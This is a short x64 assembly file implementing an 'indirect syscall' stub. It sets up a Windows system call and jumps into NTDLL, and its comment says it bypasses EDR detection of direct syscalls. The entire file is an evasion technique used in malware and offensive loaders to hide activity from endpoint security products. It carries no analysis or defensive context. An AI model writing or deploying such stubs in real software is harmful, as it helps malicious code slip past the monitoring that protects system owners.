; syscalls.asm - Indirect Syscall Bridge
.code
extern sys_number : dword
extern sys_addr   : qword

; This stub bypasses EDR "Direct Syscall" detection by jumping into NTDLL
DoIndirectSyscall proc
    mov r10, rcx
    mov eax, sys_number
    jmp qword ptr [sys_addr] 
DoIndirectSyscall endp
end
